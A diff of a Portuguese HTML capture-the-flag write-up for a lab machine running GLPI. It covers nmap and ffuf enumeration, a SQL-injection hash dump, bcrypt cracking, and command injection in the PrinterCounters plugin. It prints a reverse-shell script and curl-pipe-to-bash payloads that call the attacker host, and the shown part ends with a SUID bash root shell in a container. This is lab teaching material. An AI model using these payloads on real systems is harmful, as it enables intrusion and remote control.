@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Helpdesk - HC // 0x404 </title>
+  <title>Helpdesk - HC // 0x404</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
   <style>
@@ -83,13 +83,6 @@
     .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
     .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
     .callout-tip p { color: #44aa66; margin: 0; }
-    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
-    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
-    .callout-info p { color: #3a7a8a; margin: 0; }
-    .callout-info code { color: var(--cyan2); }
-    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
-    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
-    .callout-warn p { color: #aa6633; margin: 0; }
     footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
     .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
     @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
@@ -99,32 +92,25 @@
 <div class="grid-bg"></div>
 <div class="scanlines"></div>
 <div class="vignette"></div>
-
 <nav>
   <div class="nav-inner">
     <a href="../index.html" class="nav-logo">0x404</a>
     <a href="../index.html" class="nav-back">Voltar</a>
   </div>
 </nav>
-
 <div class="toc-wrap">
   <nav class="toc">
     <div class="toc-title">// Índice</div>
     <ol>
-      <li><a href="#recon">Information Gathering</a></li>
-      <li><a href="#enum80">Enumeração — Porta 80</a></li>
-      <li><a href="#enum8080">Enumeração — Porta 8080</a></li>
-      <li><a href="#sqli">SQLi → Hash Dump</a></li>
-      <li><a href="#rce">RCE via Plugin GLPI</a></li>
-      <li><a href="#revshell">Reverse Shell</a></li>
-      <li><a href="#privesc">PrivEsc — SUID Bash</a></li>
-      <li><a href="#escape">Docker Escape via Socket</a></li>
+      <li><a href="#information-gathering">Information Gathering</a></li>
+      <li><a href="#enum-80">Enumeração Porta 80</a></li>
+      <li><a href="#enum-8080">Enumeração Porta 8080</a></li>
+      <li><a href="#exploracao">Exploração</a></li>
+      <li><a href="#escalacao">Escalação de Privilégios</a></li>
     </ol>
   </nav>
 </div>
-
 <div class="page">
-
   <header class="wu-header">
     <div class="wu-meta">
       <span class="wu-cat cat-web">Web App</span>
@@ -134,8 +120,8 @@
     <h1 class="wu-title">Helpdesk — HC</h1>
     <p class="wu-desc">
       GLPI 10.0.17 vulnerável a SQLi via Metasploit expõe hashes de usuários. Após quebra do hash com John,
-      acesso autenticado permite RCE via plugin PrinterCounters (SQL Injection → Command Injection).
-      Escalada via SUID bash no container e Docker escape explorando socket exposto para comprometer o host.
+      acesso autenticado permite RCE via plugin PrinterCounters. Escalada via SUID bash no container
+      e Docker escape explorando socket exposto para comprometer o host.
     </p>
     <div class="wu-tags">
       <span class="tag">GLPI</span>
@@ -148,30 +134,13 @@
       <span class="tag">Docker Socket</span>
     </div>
     <div class="wu-infobar">
-      <div class="wu-infobar-item">
-        <span class="wi-label">Plataforma</span>
-        <span class="wi-value">HackClub</span>
-      </div>
-      <div class="wu-infobar-item">
-        <span class="wi-label">OS</span>
-        <span class="wi-value">Linux</span>
-      </div>
-      <div class="wu-infobar-item">
-        <span class="wi-label">Dificuldade</span>
-        <span class="wi-value" style="color:#ffaa00">Medium</span>
-      </div>
-      <div class="wu-infobar-item">
-        <span class="wi-label">IP Alvo</span>
-        <span class="wi-value">172.16.1.244</span>
-      </div>
-      <div class="wu-infobar-item">
-        <span class="wi-label">Data</span>
-        <span class="wi-value">18 ABR 2025</span>
-      </div>
+      <div class="wu-infobar-item"><span class="wi-label">Plataforma</span><span class="wi-value">HackClub</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">OS</span><span class="wi-value">Linux</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">Dificuldade</span><span class="wi-value" style="color:#ffaa00">Medium</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">IP Alvo</span><span class="wi-value">172.16.1.244</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">Data</span><span class="wi-value">18 ABR 2025</span></div>
     </div>
   </header>
-
-  <!-- ATTACK CHAIN -->
   <div class="attack-chain">
     <div class="ac-step">GLPI SQLi<br>Metasploit</div>
     <span class="ac-arrow">→</span>
@@ -185,201 +154,288 @@
     <span class="ac-arrow">→</span>
     <div class="ac-step highlight">root (host)</div>
   </div>
-
   <div class="wu-content">
 
-    <h2 id="recon">Information Gathering</h2>
+    <figure><img src="imgs/help.png" alt="Página Help Desk" /></figure>
+    <p>Escopo: 172.16.1.244</p>
 
-    <h3>Portscan — Fase 1 (All Ports)</h3>
+    <h2 id="information-gathering">Information Gathering</h2>
+    <p>Vamos iniciar esse novo projeto efetuando o processo de coleta de informações sobre o ambiente.</p>
+
+    <h3 id="portscan">Portscan</h3>
+    <p>Inicialmente vamos verificar as portas e serviços que estão ativos no ambiente.</p>
     <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -Pn -p- --min-rate 200 --max-rate 500 -sS 172.16.1.244 -oA ALL-TCP-HELPDESK
-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 10:55 -03
+Nmap scan report for 172.16.1.244
+Host is up (0.14s latency).
+Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
-8080/tcp open  http-proxy</code></pre>
+8080/tcp open  http-proxy
 
-    <h3>Portscan — Fase 2 (Service Detection)</h3>
+Nmap done: 1 IP address (1 host up) scanned in 146.62 seconds</code></pre>
+    <p>Com as portas e serviços previamente identificados no ambiente, prosseguimos com a verificação das versões e coleta de informações adicionais por meio do Nmap.</p>
     <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -Pn -p22,80,8080 -sVC 172.16.1.244 -oA Services-TCP-HELPDESK
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 11:03 -03
+Nmap scan report for 172.16.1.244
+Host is up (0.15s latency).
 
 PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1f:10:28:13:20:a1:8a:ab:0f:d4:56:26:bb:72:66:13 (ECDSA)
+|_  256 24:b5:78:c8:56:c7:d9:d3:b1:ab:8a:98:03:8b:65:62 (ED25519)
 80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
 |_http-title: Help Desk - Technical Support Solution
+|_http-server-header: Apache/2.4.58 (Ubuntu)
 8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
-|_http-title: Authentication - GLPI</code></pre>
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Authentication - GLPI
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-    <p>Duas aplicações web distintas: porta 80 com um <strong>Help Desk</strong> estático e porta 8080 com o <strong>GLPI</strong> — sistema de gerenciamento de TI.</p>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.79 seconds</code></pre>
 
+    <h3 id="hosts">Configuração do arquivo hosts</h3>
+    <p>Para facilitar a resolução de nomes, adicionamos o domínio diretamente no arquivo <code>hosts</code>.</p>
     <pre><span class="lang-label">bash</span><code>$ echo '172.16.1.244 helpdesk.hc' | sudo tee -a /etc/hosts</code></pre>
 
-    <h2 id="enum80">Enumeração Web — Porta 80</h2>
+    <h3 id="enum-80">Enumeração Web - Porta 80</h3>
+    <p>Ao acessarmos o serviço HTTP na porta 80, nos deparamos com a seguinte página inicial:</p>
+    <figure><img src="imgs/2025-04-18_11-17.png" alt="Página inicial porta 80" /></figure>
+    <p>A análise da página inicial revela que se trata de um conteúdo estático, sem funcionalidades dinâmicas aparentes. Vamos efetuar uma enumeração de arquivos e diretórios, a fim de identificar possíveis conteúdos ocultos.</p>
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt -u http://helpdesk.hc/FUZZ -c -r 
 
-    <p>Ao acessar a porta 80, identificamos uma página estática de Help Desk sem funcionalidades dinâmicas aparentes.</p>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-    <figure><img src="imgs/2025-04-18_11-17.png" alt="Página estática Help Desk na porta 80" /></figure>
+       v2.1.0-dev
+________________________________________________
 
-    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt \
-  -u http://helpdesk.hc/FUZZ -c -r
+ :: Method           : GET
+ :: URL              : http://helpdesk.hc/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/diretorios-web-wordlist.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
 
-.htaccess    [Status: 403]
-index.html   [Status: 200]
-server-status [Status: 403]</code></pre>
+                        [Status: 200, Size: 29549, Words: 11191, Lines: 479, Duration: 670ms]
+.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 144ms]
+.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 145ms]
+.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 145ms]
+index.html              [Status: 200, Size: 29549, Words: 11191, Lines: 479, Duration: 146ms]
+server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 143ms]
+:: Progress: [89621/89621] :: Job [1/1] :: 279 req/sec :: Duration: [0:05:33] :: Errors: 0 ::</code></pre>
+    <p>Nenhum arquivo ou diretório acessível foi identificado que pudesse ser explorado para dar continuidade ao processo de exploração.</p>
 
-    <p>Nenhum arquivo ou diretório acessível foi identificado para exploração. Seguimos para a porta 8080.</p>
+    <h3 id="enum-8080">Enumeração Web - Porta 8080</h3>
+    <p>Ao acessarmos o serviço HTTP na porta 8080, nos deparamos com a seguinte página inicial:</p>
+    <figure><img src="imgs/image.png" alt="Página GLPI porta 8080" /></figure>
+    <p>O acesso à aplicação requer credenciais válidas, e as tentativas com credenciais padrão não foram bem-sucedidas. Com isso, partimos para a enumeração de arquivos e diretórios ocultos em busca de possíveis vetores de acesso.</p>
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt -u http://helpdesk.hc:8080/FUZZ -c -r
+                                                                                                                      
+        /'___\  /'___\           /'___\                                                                               
+       /\ \__/ /\ \__/  __  __  /\ \__/                                                                               
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                              
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                              
+         \ \_\   \ \_\  \ \____/  \ \_\                                                                               
+          \/_/    \/_/   \/___/    \/_/                                                                               
+                                                           
+       v2.1.0-dev                                          
+________________________________________________           
 
-    <h2 id="enum8080">Enumeração Web — Porta 8080 (GLPI)</h2>
+ :: Method           : GET                                 
+ :: URL              : http://helpdesk.hc:8080/FUZZ        
+ :: Wordlist         : FUZZ: /usr/share/wordlists/diretorios-web-wordlist.txt                                         
+ :: Follow redirects : true                                
+ :: Calibration      : false                               
+ :: Timeout          : 10                                  
+ :: Threads          : 40                                  
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                           
+________________________________________________           
 
-    <p>Na porta 8080 encontramos o GLPI — aplicação de gerenciamento de helpdesk e inventário de TI. Credenciais padrão não funcionaram.</p>
-
-    <figure><img src="imgs/image.png" alt="Tela de login do GLPI na porta 8080" /></figure>
-
-    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt \
-  -u http://helpdesk.hc:8080/FUZZ -c -r
-
-LICENSE     [Status: 200]
-ajax        [Status: 200]
-front       [Status: 200]
-index.php   [Status: 200]
-install     [Status: 200]
-lib         [Status: 200]
-marketplace [Status: 403]
-plugins     [Status: 403]
-public      [Status: 200]</code></pre>
-
-    <figure><img src="imgs/image 1.png" alt="Resultado do ffuf na porta 8080 com estrutura do GLPI" /></figure>
-
-    <p>A estrutura de diretórios confirma ser um GLPI. Identificamos a versão da aplicação para busca de vulnerabilidades conhecidas.</p>
-
-    
-    <div class="callout-info">
-      <div class="cf-title">ℹ GLPI 10.0.17 — Vulnerabilidade Conhecida</div>
-      <p>Pesquisa com a dork <code>glpi 10.0.17 exploit</code> retorna um artigo detalhado sobre SQLi to RCE: <a href="https://blog.lexfo.fr/glpi-sql-to-rce.html" target="_blank">blog.lexfo.fr/glpi-sql-to-rce.html</a></p>
-    </div>
-
-    <h2 id="sqli">SQLi → Hash Dump via Metasploit</h2>
-
-    <p>Após testes manuais com base no artigo de referência não produzirem os resultados esperados, identificamos um módulo específico no Metasploit Framework para a vulnerabilidade. Configuramos os parâmetros e executamos:</p>
-
-    <figure><img src="imgs/image 2.png" alt="Módulo Metasploit configurado para GLPI SQLi" /></figure>
-    <figure><img src="imgs/image 3.png" alt="Execução do exploit confirmando vulnerabilidade" /></figure>
-
-    <p>Execução bem-sucedida — hashes de todos os usuários extraídos da tabela <code>glpi_users</code>:</p>
-
-    <pre><span class="lang-label">output — metasploit</span><code>glpi_users
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]                               
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]                               
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]                               
+                        [Status: 200, Size: 10166, Words: 3288, Lines: 246, Duration: 3891ms]
+LICENSE                 [Status: 200, Size: 35148, Words: 5836, Lines: 674, Duration: 146ms]
+ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 144ms]
+bin                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]
+config                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+css                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 148ms]
+files                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]
+front                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
+inc                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
+index.php               [Status: 200, Size: 10166, Words: 3288, Lines: 246, Duration: 189ms]
+install                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 152ms]
+js                      [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]
+lib                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 144ms]
+locales                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+marketplace             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 144ms]
+pics                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 146ms]
+plugins                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+public                  [Status: 200, Size: 10243, Words: 3288, Lines: 246, Duration: 204ms]
+resources               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+sound                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+src                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+templates               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+vendor                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+version                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 145ms]
+:: Progress: [89621/89621] :: Job [1/1] :: 277 req/sec :: Duration: [0:05:52] :: Errors: 0 ::</code></pre>
+    <p>Como não foi possível identificar arquivos ou diretórios úteis para exploração, o próximo passo é tentar descobrir a versão da aplicação GLPI em execução.</p>
+    <figure><img src="imgs/image 1.png" alt="Versão GLPI identificada" /></figure>
+    <p>Após a versão identificada, é possível realizar uma busca no Google em busca de vulnerabilidades conhecidas associadas ao serviço em questão. Podemos utilizar a dork:</p>
+    <pre><span class="lang-label">dork</span><code>glpi 10.0.17 exploit</code></pre>
+    <p>Link de referência: <a href="https://blog.lexfo.fr/glpi-sql-to-rce.html" target="_blank">https://blog.lexfo.fr/glpi-sql-to-rce.html</a></p>
+    <p>Realizamos alguns testes com base no artigo de referência utilizando o Burp Suite, porém não obtivemos os mesmos resultados. Ao investigarmos no Metasploit Framework, identificamos a existência de um módulo específico para a vulnerabilidade. Após configurar os parâmetros necessários e executar o módulo, foi confirmada a vulnerabilidade no host alvo. Vamos aguardar o termino da execução.</p>
+    <figure><img src="imgs/image 2.png" alt="Módulo Metasploit executando exploit no GLPI" /></figure>
+    <p>Assim que a execução bem-sucedida do exploit, foi possível obter os hashes de senha dos usuários cadastrados na aplicação.</p>
+    <pre><span class="lang-label">output</span><code>glpi_users
 ==========
 
-user                   password
-----                   --------
-glpi                   $2y$10$fucVSHUcQTnd4JgCos6wn.XWijq64Em2vALli0NIRqGax9FPiPh0q
-normal                 $2y$10$DzpsWVk6/E58rQMov8ZbXOMJ1jLFQw10G7soOI0EF0OVtPd6cpV6m
-post-only              $2y$10$rh.xhQiCT8Rjq6HPFKfeiOIXW2zoOmPYa.3OYUyjlsFPvbqEioCG.
-tech                   $2y$10$6XAeLVTMDwCmcO6mtJWZsuG0JYKX.lzZyeny8vSONSjDxH0R2ot8O</code></pre>
+ user                   password                                                      api_token
+ ----                   --------                                                      ---------
+ Plugin_ELPI_Inventory  36
+ glpi                   $2y$10$fucVSHUcQTnd4JgCos6wn.XWijq64Em2vALli0NIRqGax9FPiPh0q
+ glpi-system
+ normal                 $2y$10$DzpsWVk6/E58rQMov8ZbXOMJ1jLFQw10G7soOI0EF0OVtPd6cpV6m
+ post-only              $2y$10$rh.xhQiCT8Rjq6HPFKfeiOIXW2zoOmPYa.3OYUyjlsFPvbqEioCG.
+ tech                   $2y$10$6XAeLVTMDwCmcO6mtJWZsuG0JYKX.lzZyeny8vSONSjDxH0R2ot8O
 
-    <figure><img src="imgs/image 4.png" alt="Hashes extraídos da tabela glpi_users" /></figure>
-
-    <p>Apenas o usuário <code>glpi</code> estava ativo. Quebramos o hash bcrypt com John the Ripper:</p>
-
+[*] Auxiliary module execution completed</code></pre>
+    <p>Durante os testes com usuários padrão da aplicação GLPI, identificamos que apenas o usuário <code>glpi</code> estava ativo. Com isso, extraímos o hash correspondente e preparamos um arquivo para utilização no Hashcat, com o objetivo de realizar a quebra da senha.</p>
     <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt hash-glpi1 --format=bcrypt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwertyuiop       (?)     
+1g 0:00:00:09 DONE (2025-04-18 12:56) 0.1097g/s 37.54p/s 37.54c/s 37.54C/s strawberry..ihateyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</code></pre>
+    <p>Agora que conseguimos realizar a quebra do hash do usuário glpi podemos efetuar a validação da credencial efetuando a autenticação na aplicação.</p>
+    <figure><img src="imgs/image 3.png" alt="Autenticação no GLPI com credenciais obtidas" /></figure>
 
-qwertyuiop       (?)
-1g 0:00:00:09 DONE (2025-04-18 12:56)</code></pre>
-
-    <figure><img src="imgs/image 5.png" alt="John quebrando o hash bcrypt do usuário glpi" /></figure>
-
-    <div class="callout-tip">
-      <div class="cf-title">✓ Credenciais Obtidas</div>
-      <p><code>glpi</code> : <code>qwertyuiop</code></p>
-    </div>
-
-    <p>Validamos as credenciais autenticando na aplicação GLPI:</p>
-
-    <figure><img src="imgs/image 6.png" alt="Login bem-sucedido no GLPI com credenciais obtidas" /></figure>
-
-    <h2 id="rce">RCE via Plugin PrinterCounters</h2>
-
-    <p>Com acesso autenticado ao GLPI, seguimos o método descrito no artigo de referência. O plugin <strong>PrinterCounters</strong> possui um endpoint vulnerável a injeção de comandos via parâmetro <code>items_id</code>.</p>
-
-    <h3>Prova de Conceito — ICMP</h3>
-    <p>Capturamos a requisição da tela do plugin e injetamos um comando <code>curl</code> para validar a comunicação com nosso host:</p>
-
+    <h3 id="exploracao">Exploração</h3>
+    <p>A partir desse momento podemos tentar obter uma execução de comandos remota (RCE) através do método descrito no artigo encontrado. Inicialmente efetuamos a captura da requisição da tela do plugin conforme mencionado no artigo, em seguida enviamos uma requisição utilizando o curl para validar a comunicação entre os hosts.</p>
     <pre><span class="lang-label">http request</span><code>POST /plugins/printercounters/ajax/process.php HTTP/1.1
 Host: helpdesk.hc:8080
-X-Glpi-Csrf-Token: c95e95fc9d6159f5518f6...
-Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: text/html, */*; q=0.01
+X-Glpi-Csrf-Token: c95e95fc9d6159f5518f6a88f46ef36546b502314b1e3574e49c6daead58f86b
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Origin: http://helpdesk.hc:8080
+Referer: http://helpdesk.hc:8080/plugins/printercounters/front/config.form.php
+Accept-Encoding: gzip, deflate, br
+Cookie: glpi_8a3b8c36c63440d18cee792876d37eab=e6f6b2484ec4f28949ddf254d9b9c29b; glpi_8a3b8c36c63440d18cee792876d37eab_rememberme=%5B2%2C%22F43724QsYzltjbvWG1kfuXLFbwkORayeHoOWklxW%22%5D
+Connection: keep-alive
 
-action=killProcess&items_id=1231231';curl+10.0.15.12/aaaa;#</code></pre>
+action=killProcess&amp;items_id=1231231';curl+10.0.15.12/aaaa;#</code></pre>
+    <p>Ao enviarmos a requisição para a porta 80, recebemos uma resposta confirmando que a comunicação com o host atacante foi bem-sucedida.</p>
+    <figure><img src="imgs/image 4.png" alt="Comunicação confirmada com host atacante" /></figure>
+    <p>Agora que temos a confirmação da execução de comandos remota (RCE) e comunicação com nosso host de ataque, podemos enviar um arquivo para obtermos uma conexão reversa. Para isso iremos utilizar o site <a href="https://reverse-shell.sh/" target="_blank">https://reverse-shell.sh/</a>.</p>
+    <pre><span class="lang-label">bash</span><code># Reverse Shell as a Service
+# https://github.com/lukechilds/reverse-shell
+#
+# 1. On your machine:
+#      nc -l 1337
+#
+# 2. On the target machine:
+#      curl https://reverse-shell.sh/yourip:1337 | sh
+#
+# 3. Don't be a dick
 
-    <figure><img src="imgs/image 7.png" alt="Requisição com payload de RCE enviada via Burp" /></figure>
-    <figure><img src="imgs/image 8.png" alt="Request recebida no host atacante — RCE confirmado" /></figure>
+if command -v python &gt; /dev/null 2&gt;&amp;1; then
+	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.15.12",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+	exit;
+fi
 
-    <div class="callout-tip">
-      <div class="cf-title">✓ RCE Confirmado</div>
-      <p>Recebemos a requisição no nosso host — comunicação estabelecida. Pronto para enviar reverse shell.</p>
-    </div>
+if command -v perl &gt; /dev/null 2&gt;&amp;1; then
+	perl -e 'use Socket;$i="10.0.15.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+	exit;
+fi
 
-    <h2 id="revshell">Reverse Shell</h2>
+if command -v nc &gt; /dev/null 2&gt;&amp;1; then
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.15.12 443 &gt;/tmp/f
+	exit;
+fi
 
-    <p>Criamos o payload de reverse shell via <a href="https://reverse-shell.sh" target="_blank">reverse-shell.sh</a>, servimos via Python HTTP server e injetamos o comando de download e execução:</p>
+if command -v sh &gt; /dev/null 2&gt;&amp;1; then
+	/bin/sh -i &gt;&amp; /dev/tcp/10.0.15.12/443 0&gt;&amp;1
+	exit;
+fi</code></pre>
+    <p>Com o arquivo de payload devidamente criado, utilizamos o Burp Suite para enviar a requisição responsável pelo download e execução do script no host alvo.</p>
+    <pre><span class="lang-label">http request</span><code>POST /plugins/printercounters/ajax/process.php HTTP/1.1
+Host: helpdesk.hc:8080
+Content-Length: 59
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: text/html, */*; q=0.01
+X-Glpi-Csrf-Token: c95e95fc9d6159f5518f6a88f46ef36546b502314b1e3574e49c6daead58f86b
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Origin: http://helpdesk.hc:8080
+Referer: http://helpdesk.hc:8080/plugins/printercounters/front/config.form.php
+Accept-Encoding: gzip, deflate, br
+Cookie: glpi_8a3b8c36c63440d18cee792876d37eab=e6f6b2484ec4f28949ddf254d9b9c29b; glpi_8a3b8c36c63440d18cee792876d37eab_rememberme=%5B2%2C%22F43724QsYzltjbvWG1kfuXLFbwkORayeHoOWklxW%22%5D
+Connection: keep-alive
 
-    <pre><span class="lang-label">http request</span><code>action=killProcess&items_id=1231231';curl+10.0.15.12/shell|bash;#</code></pre>
+action=killProcess&amp;items_id=1231231';curl+10.0.15.12/shell|bash;#</code></pre>
+    <p>Assim que executamos a requisição obtemos a conexão reversa com o ambiente.</p>
+    <figure><img src="imgs/image 5.png" alt="Conexão reversa estabelecida" /></figure>
+    <p>OBS: Para conexão reversa utilizamos o script Penelope. <a href="https://github.com/brightio/penelope" target="_blank">https://github.com/brightio/penelope</a></p>
+    <p>Com acesso interativo no host podemos ir em busca da nossa primeira evidência que está localizada dentro da raiz (/) do sistema.</p>
+    <figure><img src="imgs/image 6.png" alt="Primeira evidência obtida na raiz do container" /></figure>
+    <p>Efetuado algumas analises de forma manual identificamos que estamos dentro de container(docker).</p>
 
-    <figure><img src="imgs/image 9.png" alt="Payload de reverse shell enviado via Burp" /></figure>
-    <figure><img src="imgs/image 10.png" alt="Reverse shell recebida via Penelope" /></figure>
-
-    <p>Shell recebida! Referência: <a href="https://github.com/brightio/penelope" target="_blank">Penelope</a></p>
-
-    <p>Com acesso ao host, localizamos a primeira evidência na raiz <code>/</code> do sistema e confirmamos que estamos dentro de um <strong>container Docker</strong>.</p>
-
-    <div class="callout-flag">
-      <div class="cf-title">🚩 Flag 1 — User Flag</div>
-      <p>Obtida na raiz <code>/</code> do container após acesso via RCE</p>
-    </div>
-
-    <h2 id="privesc">Escalada de Privilégios — SUID Bash</h2>
-
-    <p>Para dar continuidade ao Docker escape, primeiro precisamos de acesso root dentro do container. Transferimos o <strong>CDK</strong> para enumeração:</p>
-
+    <h3 id="escalacao">Escalação de Privilégios</h3>
+    <p>Para dar continuidade ao processo de exploração, é necessário realizar a escalada de privilégios e obter acesso como usuário root. Somente com privilégios elevados será possível, posteriormente, realizar o escape do ambiente Docker para o host. Para isso vamos utilizar a ferramenta CDK.</p>
+    <p>Link de referência: <a href="https://github.com/cdk-team/CDK" target="_blank">https://github.com/cdk-team/CDK</a></p>
     <pre><span class="lang-label">bash</span><code>$ wget http://10.0.15.12/cdk_linux
-$ chmod +x cdk_linux
-$ ./cdk_linux evaluate --full</code></pre>
+--2025-04-18 17:01:53--  http://10.0.15.12/cdk_linux
+Connecting to 10.0.15.12:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10395800 (9.9M) [application/octet-stream]
+Saving to: 'cdk_linux'
 
-    <p>Referência: <a href="https://github.com/cdk-team/CDK" target="_blank">github.com/cdk-team/CDK</a></p>
+cdk_linux           100%[===================&gt;]   9.91M  50.6KB/s    in 2m 35s  
 
-    <p>O CDK identificou o binário <code>/usr/bin/bash</code> com permissões <strong>SUID</strong>. Executamos com o parâmetro <code>-p</code> para preservar os privilégios elevados:</p>
-
-    <pre><span class="lang-label">bash</span><code>$ /usr/bin/bash -p
-bash-5.2# whoami
-root</code></pre>
-
